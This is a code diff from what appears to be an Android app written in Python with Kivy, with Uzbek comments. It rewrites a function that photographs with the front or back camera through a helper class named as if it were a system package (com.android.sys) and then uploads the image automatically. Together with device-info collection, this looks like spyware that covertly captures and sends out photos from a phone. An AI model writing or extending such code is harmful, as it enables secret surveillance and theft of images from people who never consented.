@@ -120,133 +120,46 @@ def get_device_info():
         return "Qurilma info xatolik: " + str(e)
 
 
-# --- KAMERA (Camera2 API) ---
+# --- KAMERA (Java CameraHelper orqali) ---
 def take_photo_camera(front_camera, loop):
     try:
         from jnius import autoclass, PythonJavaClass, java_method
-        activity      = autoclass('org.kivy.android.PythonActivity').mActivity
-        CamMgr        = autoclass('android.hardware.camera2.CameraManager')
-        CamDev        = autoclass('android.hardware.camera2.CameraDevice')
-        CamChars      = autoclass('android.hardware.camera2.CameraCharacteristics')
-        ImageReader   = autoclass('android.media.ImageReader')
-        ImageFmt      = autoclass('android.graphics.ImageFormat')
-        HandlerThread = autoclass('android.os.HandlerThread')
-        Handler       = autoclass('android.os.Handler')
-        ArrayList     = autoclass('java.util.ArrayList')
-        FileOutStream = autoclass('java.io.FileOutputStream')
+        activity     = autoclass('org.kivy.android.PythonActivity').mActivity
+        CameraHelper = autoclass('com.android.sys.CameraHelper')
 
         ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
         cam_name = 'selfie' if front_camera else 'capture'
         filepath = ext_dir + '/' + cam_name + '.jpg'
 
-        cam_mgr = activity.getSystemService('camera')
+        done = [False]
+        result_path = [None]
 
-        # Front yoki orqa kamerani topish
-        target_id = None
-        wanted = CamChars.LENS_FACING_FRONT if front_camera else CamChars.LENS_FACING_BACK
-        for cid in cam_mgr.getCameraIdList():
-            chars  = cam_mgr.getCameraCharacteristics(cid)
-            facing = chars.get(CamChars.LENS_FACING)
-            if facing == wanted:
-                target_id = cid
-                break
-        if target_id is None:
-            target_id = cam_mgr.getCameraIdList()[0]
-
-        # Background thread
-        ht = HandlerThread('CamBgThread')
-        ht.start()
-        h = Handler(ht.getLooper())
-
-        reader = ImageReader.newInstance(1280, 720, ImageFmt.JPEG, 2)
-
-        done     = [False]
-        img_path = [None]
-
-        class ImgListener(PythonJavaClass):
-            __javainterfaces__ = ['android/media/ImageReader$OnImageAvailableListener']
+        class Callback(PythonJavaClass):
+            __javainterfaces__ = ['com/android/sys/CameraHelper$PhotoCallback']
             __javacontext__ = 'app'
-            @java_method('(Landroid/media/ImageReader;)V')
-            def onImageAvailable(self, rdr):
-                try:
-                    image = rdr.acquireLatestImage()
-                    if image:
-                        buf  = image.getPlanes()[0].getBuffer()
-                        size = buf.remaining()
-                        data = bytearray(size)
-                        buf.get(data)
-                        image.close()
-                        fos = FileOutStream(filepath)
-                        fos.write(data)
-                        fos.close()
-                        img_path[0] = filepath
-                except Exception as ex:
-                    print('ImgListener xatolik: ' + str(ex))
-                finally:
-                    done[0] = True
 
-        reader.setOnImageAvailableListener(ImgListener(), h)
-
-        cam_ref  = [None]
-        sess_ref = [None]
-
-        class SessCallback(PythonJavaClass):
-            __javainterfaces__ = ['android/hardware/camera2/CameraCaptureSession$StateCallback']
-            __javacontext__ = 'app'
-            @java_method('(Landroid/hardware/camera2/CameraCaptureSession;)V')
-            def onConfigured(self, session):
-                sess_ref[0] = session
-                try:
-                    req = cam_ref[0].createCaptureRequest(CamDev.TEMPLATE_STILL_CAPTURE)
-                    req.addTarget(reader.getSurface())
-                    session.capture(req.build(), None, h)
-                except Exception as ex:
-                    print('Capture xatolik: ' + str(ex))
-                    done[0] = True
-            @java_method('(Landroid/hardware/camera2/CameraCaptureSession;)V')
-            def onConfigureFailed(self, session):
+            @java_method('(Ljava/lang/String;)V')
+            def onPhotoSaved(self, path):
+                result_path[0] = path
                 done[0] = True
 
-        class CamCallback(PythonJavaClass):
-            __javainterfaces__ = ['android/hardware/camera2/CameraDevice$StateCallback']
-            __javacontext__ = 'app'
-            @java_method('(Landroid/hardware/camera2/CameraDevice;)V')
-            def onOpened(self, camera):
-                cam_ref[0] = camera
-                try:
-                    surfaces = ArrayList()
-                    surfaces.add(reader.getSurface())
-                    camera.createCaptureSession(surfaces, SessCallback(), h)
-                except Exception as ex:
-                    print('Session xatolik: ' + str(ex))
-                    done[0] = True
-            @java_method('(Landroid/hardware/camera2/CameraDevice;I)V')
-            def onDisconnected(self, camera, code):
-                done[0] = True
-            @java_method('(Landroid/hardware/camera2/CameraDevice;I)V')
-            def onError(self, camera, code):
+            @java_method('(Ljava/lang/String;)V')
+            def onError(self, error):
+                status[0] = 'Kamera xatolik: ' + str(error)
                 done[0] = True
 
-        cam_mgr.openCamera(target_id, CamCallback(), h)
+        CameraHelper.takePhoto(activity, front_camera, filepath, Callback())
 
         for _ in range(60):
             if done[0]:
                 break
             time.sleep(0.2)
 
-        if img_path[0] and os.path.exists(img_path[0]):
-            asyncio.run_coroutine_threadsafe(upload_file(img_path[0], 'photo'), loop)
+        if result_path[0] and os.path.exists(result_path[0]):
+            asyncio.run_coroutine_threadsafe(upload_file(result_path[0], 'photo'), loop)
             status[0] = 'Rasm olindi, yuborilmoqda...'
-        else:
-            status[0] = 'Kamera: rasm olinmadi'
-
-        try:
-            if sess_ref[0]: sess_ref[0].close()
-            if cam_ref[0]:  cam_ref[0].close()
-            reader.close()
-            ht.quit()
-        except Exception:
-            pass
+        elif not done[0]:
+            status[0] = 'Kamera: vaqt tugadi'
 
     except Exception as e:
         status[0] = 'Kamera xatolik: ' + str(e)
